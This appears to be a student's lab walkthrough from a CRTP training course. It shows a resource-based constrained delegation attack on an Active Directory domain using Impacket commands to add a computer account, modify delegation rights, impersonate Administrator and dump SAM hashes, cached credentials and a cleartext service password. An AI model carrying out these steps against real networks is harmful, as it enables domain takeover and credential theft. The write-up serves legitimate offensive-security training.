#### Theory can be found in [[2. Domain Privilege Escalation#5. RBCD]] ####

- `dcorp\ciadmin` has GenericWrite permissions (BloodHound) over `DCORP-MGMT` which allows an RCDB abuse.
- Add a new computer that will be used for the attack. 
```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CRTP]
└─# impacket-addcomputer dollarcorp.moneycorp.local/ciadmin:'*ContinuousIntrusion123' -method LDAPS -computer-name 'WS007$' -computer-pass 'Password123!' -dc-ip 172.16.2.1 -domain-netbios dollarcorp.moneycorp.local 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account WS007$ with password Password123!.
```

- Modify the target object so that the attacker-controlled computer can delegate to it.
```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CRTP]
└─# impacket-rbcd dollarcorp.moneycorp.local/ciadmin:'*ContinuousIntrusion123' -delegate-from 'WS007$' -delegate-to 'DCORP-MGMT$' -action 'write'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] WS007$ can now impersonate users on DCORP-MGMT$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     WS007$       (S-1-5-21-719815819-3726368948-3917688648-17101)
```

- Request a TGS for the service name we want to pretend to have administrative privileges for.
```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CRTP]
└─# impacket-getST dollarcorp.moneycorp.local/'WS007$':'Password123!' -spn cifs/dcorp-mgmt.dollarcorp.moneycorp.local -impersonate Administrator 
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

- Use the requested TGS to access `DCORP-MGMT`.
```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CRTP]
└─# impacket-secretsdump dollarcorp.moneycorp.local/Administrator@DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL -k -no-pass                             
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x6ccf075765eb06dec2c85646e11ac0e5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cda7ba90f97db93107a190469cd3201b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
DOLLARCORP.MONEYCORP.LOCAL/svcadmin:$DCC2$10240#svcadmin#80dcb7982483a2ee1aaa9ef2da703179: (2022-11-15 03:33:58)
DOLLARCORP.MONEYCORP.LOCAL/mgmtadmin:$DCC2$10240#mgmtadmin#b51b86694af5c690d2ad019fbfc00707: (2023-03-04 09:41:21)

<snip>

NL$KM:09c87bc296416ecbb2f61bdc295c39767ea62297dcd3be6bc3714871616bb2b3d0d6e048f08b7d8b8b149505b421fe93285147f12624b5f4e420b6ace5903302
[*] _SC_MSSQLSERVER 
dcorp\svcadmin:*ThisisBlasphemyThisisMadness!!
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

- `dcorp\svcadmin` is a DA.